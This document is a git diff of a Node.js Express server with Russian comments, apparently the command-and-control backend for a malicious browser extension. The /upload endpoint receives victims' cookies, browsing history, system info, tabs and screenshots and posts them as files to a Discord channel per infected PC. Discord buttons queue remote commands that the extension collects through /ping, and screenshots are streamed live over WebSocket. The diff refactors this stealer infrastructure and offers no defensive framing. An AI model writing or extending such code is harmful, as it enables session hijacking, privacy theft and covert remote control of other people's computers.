@@ -1,3 +1,4 @@
+// server.js
 import express from "express";
 import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
 import { WebSocketServer } from "ws";
@@ -14,19 +15,20 @@ app.use(express.json({ limit: "50mb" }));
 const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
 const GUILD_ID = process.env.GUILD_ID;
 const CATEGORY_NAME = "Все ПК";
-
 const ONLINE_TIMEOUT = 3 * 60 * 1000; // 3 минуты
-const onlinePCs = {};
-const pendingCommands = {};
-const channelByPC = {};
-const messagesWithButtons = {};
-const wsClients = {}; // pcId -> массив ws
 
-// ---------------- Discord Bot ----------------
+// ---------- Состояние ----------
+const onlinePCs = {};          // pcId -> timestamp
+const pendingCommands = {};    // pcId -> array of commands
+const channelByPC = {};        // pcId -> channelId
+const wsClients = {};          // pcId -> array of ws
+const messagesWithButtons = {}; // pcId -> messageId
+
+// ---------- Discord Bot ----------
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
 bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));
 
-// ---------------- Кнопки ----------------
+// ---------- Кнопки ----------
 function createControlButtons(pcId) {
     const safePcId = encodeURIComponent(pcId);
     return [new ActionRowBuilder().addComponents(
@@ -38,12 +40,12 @@ function createControlButtons(pcId) {
     )];
 }
 
-// ---------------- Обработка кнопок ----------------
+// ---------- Обработка кнопок ----------
 bot.on("interactionCreate", async interaction => {
     if(!interaction.isButton()) return;
+
     const [command, encodedPcId] = interaction.customId.split("|");
     const pcId = decodeURIComponent(encodedPcId);
-
     const lastPing = onlinePCs[pcId];
     const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);
 
@@ -62,7 +64,7 @@ bot.on("interactionCreate", async interaction => {
     await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral:true });
 });
 
-// ---------------- Категория и канал ----------------
+// ---------- Категория и канал ----------
 async function getOrCreateCategory(guild, name){
     const channels = await guild.channels.fetch();
     let category = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
@@ -77,60 +79,53 @@ async function getOrCreateTextChannel(guild, name, parentId){
     return channel;
 }
 
-// ---------------- Приём данных от расширения ----------------
+// ---------- Приём данных от расширения ----------
 app.post("/upload", async (req, res) => {
     try {
-        const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot, command } = req.body;
+        const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } = req.body;
         if(!pcId) return res.status(400).json({ error:"pcId required" });
 
         onlinePCs[pcId] = Date.now();
         const guild = await bot.guilds.fetch(GUILD_ID);
         const category = await getOrCreateCategory(guild, CATEGORY_NAME);
+        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
+        const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
+        channelByPC[pcId] = finalChannel.id;
 
-        let channel;
-        if(channelByPC[pcId]){
-            try { channel = await guild.channels.fetch(channelByPC[pcId]); }
-            catch { channel = await getOrCreateTextChannel(guild, pcId, category.id); }
-        } else channel = await getOrCreateTextChannel(guild, pcId, category.id);
-
-        channelByPC[pcId] = channel.id;
-
-        // Отправка файлов
+        // ---------- Отправка файлов ----------
         const files = [];
         if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
         if(history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
         if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
         if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
 
-        if(files.length) await channel.send({ files });
+        if(files.length) await finalChannel.send({ files });
 
-        // Кнопки: отправляем отдельным сообщением
+        // ---------- Кнопки ----------
+        // Удаляем старое сообщение с кнопками
         if(messagesWithButtons[pcId]){
             try {
-                const oldMsg = await channel.messages.fetch(messagesWithButtons[pcId]);
-                if(oldMsg) await oldMsg.edit({ content: `Управление ПК ${pcId}`, components: createControlButtons(pcId) });
-            } catch(err){ 
-                const newMsg = await channel.send({ content:`Управление ПК ${pcId}`, components:createControlButtons(pcId) });
-                messagesWithButtons[pcId] = newMsg.id;
-            }
-        } else {
-            const newMsg = await channel.send({ content:`Управление ПК ${pcId}`, components:createControlButtons(pcId) });
-            messagesWithButtons[pcId] = newMsg.id;
+                const oldMsg = await finalChannel.messages.fetch(messagesWithButtons[pcId]);
+                if(oldMsg) await oldMsg.delete();
+            } catch(e){}
         }
+        // Создаём новое сообщение с кнопками
+        const newMsg = await finalChannel.send({ content: `Управление ПК ${pcId}`, components: createControlButtons(pcId) });
+        messagesWithButtons[pcId] = newMsg.id;
 
-        // Отправка скриншота через WS
+        // ---------- Отправка скриншота через WS ----------
         if(screenshot && wsClients[pcId]){
             wsClients[pcId].forEach(ws => ws.send(screenshot));
         }
 
         res.json({ success:true });
-    } catch(err){ 
-        console.error(err); 
-        res.status(500).json({ error: err.message }); 
+    } catch(err){
+        console.error(err);
+        res.status(500).json({ error: err.message });
     }
 });
 
-// ---------------- Пинг от расширения ----------------
+// ---------- Пинг от расширения ----------
 app.post("/ping", (req, res) => {
     const { pcId } = req.body;
     if(!pcId) return res.status(400).json({ error:"pcId required" });
@@ -141,10 +136,10 @@ app.post("/ping", (req, res) => {
     res.json({ commands });
 });
 
-// ---------------- Статика ----------------
+// ---------- Статика ----------
 app.use(express.static(join(__dirname, "public"))); // HTML/JS клиент
 
-// ---------------- WebSocket ----------------
+// ---------- WebSocket ----------
 const wss = new WebSocketServer({ noServer: true });
 
 wss.on("connection", (ws, req) => {
@@ -160,13 +155,13 @@ wss.on("connection", (ws, req) => {
     });
 });
 
-// ---------------- HTTP + WS ----------------
+// ---------- HTTP + WS ----------
 const server = http.createServer(app);
 server.on("upgrade", (request, socket, head) => {
     wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
 });
 
-// ---------------- Запуск ----------------
+// ---------- Запуск ----------
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));
 bot.login(DISCORD_BOT_TOKEN);
